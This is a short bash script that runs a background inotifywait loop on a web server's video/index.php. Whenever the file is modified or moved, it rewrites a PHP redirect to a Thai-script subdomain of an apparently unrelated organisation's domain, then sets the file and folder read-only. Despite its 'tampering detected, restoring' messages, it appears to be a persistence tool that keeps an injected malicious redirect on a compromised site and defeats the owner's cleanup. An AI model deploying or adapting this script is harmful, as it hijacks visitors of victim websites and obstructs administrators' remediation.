#!/bin/bash

FILES=(
  "/var/www/html/video/index.php"
)

CORRECT_LINE='header("Location: https://xn--72c5afai6bu6b9dya2jf5hsa.lazismubantul.org/403.html");'

fix_file() {
  FILE="$1"
  DIR=$(dirname "$FILE")

  CURRENT_LINE=$(grep -o 'header("Location:.*");' "$FILE")
  if [ "$CURRENT_LINE" != "$CORRECT_LINE" ]; then
    echo "[*] Detected tampering in $FILE, restoring..."
    chmod 0755 "$DIR"
    chmod 0644 "$FILE"
    sed -i "s|header(\"Location:.*\");|$CORRECT_LINE|" "$FILE"
    chmod 0444 "$FILE"
    chmod 0555 "$DIR"
  fi
}

for FILE in "${FILES[@]}"; do
  # Jalankan monitor secara background untuk tiap file
  while true; do
    inotifywait -e modify -e delete_self -e move_self "$FILE" >/dev/null 2>&1
    [ -f "$FILE" ] && fix_file "$FILE"
  done &
done

wait
